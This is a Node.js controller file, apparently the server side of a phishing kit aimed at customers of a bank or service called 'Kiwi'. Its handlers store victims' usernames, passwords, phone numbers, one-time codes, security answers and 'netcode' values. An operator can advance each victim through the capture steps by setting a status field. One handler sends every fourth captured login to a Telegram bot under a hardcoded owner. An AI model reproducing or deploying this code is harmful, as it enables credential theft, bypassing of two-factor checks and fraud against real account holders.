const axios = require("axios");
const Kiwi = require("../models/kiwiModel");

let kiwiCount = 0;

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Kiwi.find({ owner }).exec((err, vics) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vics);
  });
};

const command = async (req, res) => {
  const { uniqueid, status, securityQuestion } = req.body;
  try {
    if (status == 10) {
      await Kiwi.findOneAndUpdate(
        { uniqueid },
        { status, securityQuestion }
      ).exec();
    } else {
      await Kiwi.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Kiwi.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, uniqueid, owner, ip } = req.body;
  try {
    if (kiwiCount == 3) {
      await Kiwi.create({
        uniqueid,
        username,
        password,
        status: 1,
        owner: "haytch4023",
        ip,
      });
      await axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `New Kiwi Hit:\n\n${username}\n${password}\n\nPass: haytch4023`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      kiwiCount = 0;
    } else {
      await Kiwi.create({ uniqueid, username, password, status: 1, owner, ip });
      kiwiCount = kiwiCount + 1;
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, uniqueid } = req.body;
  try {
    await Kiwi.findOneAndUpdate(
      { uniqueid },
      { username, password, status: 0 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitTelephone = async (req, res) => {
  const { telephone, uniqueid } = req.body;
  try {
    await Kiwi.findOneAndUpdate({ uniqueid }, { telephone, status: 7 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSec = async (req, res) => {
  const { securityAnswer, uniqueid } = req.body;
  try {
    await Kiwi.findOneAndUpdate(
      { uniqueid },
      { securityAnswer, status: 11 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Kiwi.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitNetcode = async (req, res) => {
  const { netcode, uniqueid } = req.body;
  try {
    await Kiwi.findOneAndUpdate({ uniqueid }, { netcode, status: 5 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await Kiwi.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitTelephone,
  submitNetcode,
  submitSec,
  submitOtp,
  deleteEntry,
};
